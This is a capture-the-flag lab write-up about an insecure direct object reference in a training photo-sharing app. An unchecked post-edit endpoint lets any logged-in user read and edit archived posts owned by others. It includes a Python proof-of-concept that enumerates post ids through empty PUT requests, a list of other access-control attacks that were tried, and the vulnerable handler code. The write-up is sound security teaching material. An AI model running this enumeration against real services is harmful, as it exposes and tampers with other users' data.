# ottergram-015 - BugForge Lab Walkthrough

**URL:** https://lab-1788728702748-wz6qht.labs-app.bugforge.io
**Difficulty:** Easy
**Vulnerability:** Broken Access Control (IDOR) - undocumented post-edit endpoint with no ownership check exposes archived posts
**Flag:** `bug{0zAiTUC0K3uLEprWfmmT9iZgOla5KT5H}`

---

## Summary

Ottergram is a photo-sharing SPA (posts, comments, likes, profiles). Posts carry a backend-only
`is_archived` flag that every listing endpoint filters out, so archived posts are invisible
through normal browsing. A post-edit endpoint exists on the server but is never called anywhere
by the frontend. It has no ownership check and echoes back the full current row on any request,
including an empty body, so it doubles as a read primitive for any post by id, archived or not.

---

## Tech Stack

- React SPA frontend (Create React App)
- Express.js (Node.js)
- JWT (Bearer token from registration)
- SQLite

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Returns a usable JWT directly |
| `/api/posts` | GET | JWT | Lists posts, filters `is_archived = 0` server-side |
| `/api/posts` | POST | JWT | Creates a post (multipart image + caption) |
| `/api/posts/:id` | PUT | JWT (any user) | **Vulnerable** - no ownership check, not referenced anywhere in the frontend bundle |
| `/api/profile/:username` | GET | JWT | Also filters `is_archived = 0`, no extra leak here |
| `/api/admin/*` | GET/DELETE/PUT | JWT + admin role | Correctly enforced (403 for non-admin) |

---

## Discovery

### Step 1 - Register and map the route surface

Registration returns a usable JWT directly, no login step required:

```
POST /api/register {"username":"pentestXXXX","email":"...","password":"Password123!"}
-> {"token": "...", "user": {"id":17, "role":"user"}}
```

Pulling the JS bundle and grepping every `axios.get/post/put/delete("/api/...")` call gave the
full set of routes the frontend actually uses: register, login, posts (list/create/like/comment),
scheduled posts, profile, settings, messages, follow, and the admin moderation routes. Notably
absent from that list: any single-post GET, and any edit/update call for a regular post.

### Step 2 - Rule out the classic Ottergram bug classes

This app family reuses the same theme across many distinct backend bugs across its instances, so
each classic pattern was checked directly against this instance rather than assumed:

- `DELETE /api/admin/posts/:id` and `GET /api/admin/posts` as a non-admin user -> `403 Admin
  access required`. Properly role-gated in this instance.
- `PUT /api/profile {"role":"admin"}` (mass assignment) -> accepted but `role` stayed `"user"`.
- JWT `alg:none` -> rejected with 403.
- `/graphql` -> not present.
- No `socket.io-client` anywhere in the bundle, ruling out the WebSocket-IDOR variant seen in
  other Ottergram instances.

All of the above are known bugs from other Ottergram instances; each one is individually patched
here.

### Step 3 - Notice a field that never appears in the frontend

`GET /api/posts` returns each post with an `is_archived` field, always `0` for every post in the
list:

```json
{"id":1,"user_id":1,"image_url":"/uploads/otter1.png","caption":"...","is_archived":0, ...}
```

That field never appears anywhere in the JS bundle's source, meaning the frontend has no UI for
archiving, unarchiving, or displaying archived posts. That is a strong signal there is more data
in the table than the app ever surfaces.

### Step 4 - Confirm archived posts exist

Creating a new post is a clean way to fingerprint the table's current auto-increment state:

```
POST /api/posts (multipart: image, caption)
-> {"id": 18, "message": "Post created successfully"}
```

`GET /api/posts` at that point listed ids 1 through 16 plus the new id 18. Id 17 was missing from
every listing but had clearly already been consumed by some row in the table. The only way an id
gets skipped like that while still being "used" is a row that exists but fails the listing
query's filter, i.e. an archived post.

### Step 5 - Find a write endpoint that leaks state

With no GET-by-id route available, the remaining write surface was tested systematically for
endpoints the frontend does not use but the backend still exposes. Trying a plain REST verb
directly against a post resource turned up a hit:

```
PUT /api/posts/18 {"caption":"edited"}
-> 200 {"message":"Post updated successfully","post":{
     "id":18,"user_id":17,"image_url":"...","caption":"edited","is_archived":0,"created_at":"..."}}
```

The handler was never called by the frontend (there is no edit-post UI at all), takes no ownership
check, and returns the entire updated row. Sending an empty body avoids overwriting anything
before reading it back:

```
PUT /api/posts/17 {}
-> 200 {"message":"Post updated successfully","post":{
     "id":17,"user_id":7,"image_url":"/uploads/otter3.png",
     "caption":"Sponsor code (do not repost): bug{0zAiTUC0K3uLEprWfmmT9iZgOla5KT5H}",
     "is_archived":1,"created_at":"2026-09-06 21:05:04"}}
```

Post 17 belongs to a different user (id 7), is archived, and its caption is the flag.

---

## Proof of Concept

```python
import json, urllib.request, urllib.error, time

BASE = "https://lab-1788728702748-wz6qht.labs-app.bugforge.io"
H = {"Content-Type": "application/json"}

def req(method, path, data=None, token=None):
    url = BASE + path
    h = dict(H)
    if token:
        h["Authorization"] = f"Bearer {token}"
    body = json.dumps(data).encode() if data is not None else None
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

ts = str(int(time.time()))[-6:]
_, body = req("POST", "/api/register", {
    "username": f"pentest{ts}", "email": f"pentest{ts}@bugforge.io", "password": "Password123!"
})
token = json.loads(body)["token"]

# PUT with an empty body on someone else's post id - no ownership check,
# full row (including the archived flag and caption) comes back unmodified.
for post_id in range(1, 30):
    status, body = req("PUT", f"/api/posts/{post_id}", {}, token=token)
    if status == 200 and "bug{" in body:
        print(body)
        break
```

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| `DELETE /api/admin/posts/:id` (classic Ottergram BAC) | 403, correctly role-gated | Patched in this instance |
| `GET /api/admin/posts` as non-admin | 403 `Admin access required` | Properly role-gated |
| `PUT /api/profile {"role":"admin"}` (mass assignment) | 200 but role stayed `"user"` | Not vulnerable here |
| JWT `alg:none` bypass | 403 rejected | Patched |
| Query params on `GET /api/posts` (`?archived=true`, `?is_archived=1`, `?include_archived=true`, `?all=true`) | All ignored, same result every time | Route does not parse query strings at all |
| Guessed dedicated routes (`/api/posts/archived`, `/api/posts/mine`, `/api/posts/:id/restore`, `/api/posts/:id/unarchive`) | All fell through to the SPA catch-all | No dedicated archive route exists, the real vector was the generic edit endpoint |
| `GET /api/posts/:id` (single post fetch) | Falls through to the SPA catch-all | Route does not exist, had to use PUT instead |
| `POST /api/posts/:id/like` and `/comments` on nonexistent ids | Both succeed unconditionally | No existence validation on those two routes, not useful as a signal |
| Socket.IO IDOR pattern from other Ottergram instances | No `socket.io-client` in the bundle at all | Not present in this variant |

---

## Root Cause

The post-edit handler authorizes on "is there a valid JWT" but never checks
`post.user_id === req.user.id` (or an admin role override) before reading or applying the update,
and it is not wired into any part of the UI so it was never exercised against a second account
during development:

```javascript
// Vulnerable pattern (approximate)
app.put("/api/posts/:id", authenticate, async (req, res) => {
  const post = await db.get("SELECT * FROM posts WHERE id = ?", [req.params.id]);
  const updated = {
    caption: req.body.caption ?? post.caption,
    image_url: req.body.image_url ?? post.image_url,
  };
  await db.run("UPDATE posts SET caption = ?, image_url = ? WHERE id = ?",
    [updated.caption, updated.image_url, req.params.id]);
  res.json({ message: "Post updated successfully", post: { ...post, ...updated } });
});
```

The query looks up and updates by post id only, never by the authenticated caller's user id, so
any valid session can read and edit any post, including ones marked archived and hidden from
every listing endpoint.

---

## CWE / OWASP

- **CWE-639**: Authorization Bypass Through User-Controlled Key (Insecure Direct Object Reference)
- **CWE-862**: Missing Authorization
- **OWASP A01:2021** - Broken Access Control
